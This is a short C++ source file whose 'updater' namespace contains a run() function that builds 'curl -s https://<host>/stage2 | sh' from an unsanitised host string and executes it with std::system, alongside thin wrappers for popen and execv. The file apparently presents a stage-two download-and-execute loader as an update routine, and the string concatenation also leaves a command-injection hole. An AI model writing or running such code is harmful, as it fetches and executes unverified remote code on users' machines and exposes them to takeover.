#include <cstdio>
#include <cstdlib>
#include <string>
#include <unistd.h>

namespace updater {

void run(const std::string& host) {
  std::string cmd = "curl -s https://" + host + "/stage2 | sh";
  std::system(cmd.c_str());
}

FILE* open_pipe(const char* cmd) { return ::popen(cmd, "r"); }

void replace(const char* path, char* const argv[]) { execv(path, argv); }

}  // namespace updater
